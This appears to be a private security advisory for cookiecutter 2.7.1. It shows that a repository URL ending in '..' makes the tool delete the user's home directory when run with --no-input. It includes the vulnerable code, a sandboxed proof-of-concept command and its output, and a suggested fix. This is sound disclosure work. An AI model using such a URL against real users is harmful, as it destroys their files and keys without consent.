# Report 1 of 3: Repository URL with basename `..` causes `--no-input` to rmtree the cache PARENT (the user's home directory) before cloning

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

- Affected version: cookiecutter 2.7.1 (current main, source install)
- Reported via private vulnerability reporting per SECURITY.md ("Git and zip-based template retrieval" is listed in scope)

## Description

`clone()` in `cookiecutter/vcs.py` derives the repository cache directory from the URL's last path segment:

```python
repo_url = ...
repo_name = os.path.split(urlpath(repo_url).path.rstrip('/'))[-1]   # '..' for .../x/..
repo_dir = os.path.normpath(os.path.join(clone_to_dir, repo_name))   # == clone_to_dir's PARENT
if repo_dir exists: prompt_and_delete(repo_dir, ...)                 # --no-input -> rmtree unconditionally
```

For a URL like `https://git.example.com/x/..`, `repo_name` is literally `..`, so `repo_dir` normalizes to the **parent of the cookiecutters cache directory — i.e. the user's home directory**. `prompt_and_delete` then removes it before any `git clone` is attempted, and `--no-input` bypasses the confirmation prompt entirely.

## Impact

One command destroys the user's home directory (all user files, dotfiles, keys) with no network interaction needed — the deletion happens **before** the clone, so the URL host does not even need to exist. A victim only has to be tricked into running `cookiecutter <attacker-chosen-url> --no-input` (copy-pasted from docs/tutorials, where `--no-input` is the most commonly recommended flag). This far exceeds what the user consents to in the cache-reuse prompt ("delete and re-download the cached template").

## PoC

Verified on cookiecutter 2.7.1 (source install). A sandbox home stands in for the real HOME (safety):

```bash
mkdir -p /tmp/demo_home/.cookiecutters
echo "irreplaceable data" > /tmp/demo_home/precious.txt
HOME=/tmp/demo_home cookiecutter https://git.example.com/x/.. --no-input
ls /tmp/demo_home
```

## Execution result

```
$ HOME=/tmp/demo_home cookiecutter https://git.example.com/x/.. --no-input
... File "cookiecutter/vcs.py", line .., in clone
    subprocess.check_call(['git', 'clone', repo_url, repo_dir], ...)
FileNotFoundError: [Errno 2] No such file or directory: '.../demo_home/.cookiecutters'

$ ls /tmp/demo_home
ls: cannot access '/tmp/demo_home': No such file or directory
```

The entire home directory (including `precious.txt` and `.cookiecutters` itself) was removed by `prompt_and_delete` before the failed clone; the `FileNotFoundError` proves the delete happened first.

Suggested fix direction (for the maintainers' consideration): reject `repo_name` values that are empty, `.`, `..`, or contain path separators before any filesystem operation.
